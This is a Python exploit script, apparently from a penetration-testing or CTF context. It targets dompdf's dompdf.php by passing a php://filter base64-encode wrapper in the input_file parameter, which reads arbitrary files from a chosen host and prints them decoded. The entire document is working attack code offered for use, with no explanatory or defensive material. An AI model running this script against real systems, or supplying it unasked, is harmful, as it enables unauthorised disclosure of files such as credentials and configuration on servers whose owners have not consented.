#!/usr/bin/python3


import argparse
import requests
import sys
import re
import base64

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to decode base64
def b64d(s):
    return base64.b64decode(s).decode()

# Function to get the base64 content
def readFile(rhost,file):
    print("[+] Let's get the file you want !! [+]")
    print("[+] The file is %s !! [+]" %file)
    print(" ----------------------------------------- ")
    url = "http://%s:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=%s" %(rhost,file)
    response = r.get(url, proxies=proxies)
    base64_file= re.search('\[\(.*\]', response.text).group(0)
    base64_file = base64_file.removeprefix('[(').removesuffix(')]')
    base64_decoded = b64d(base64_file)
    print(base64_decoded.strip())
    print(" ----------------------------------------- ")
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's read the file
    readFile(rhost,file)

if __name__ == '__main__':
    main()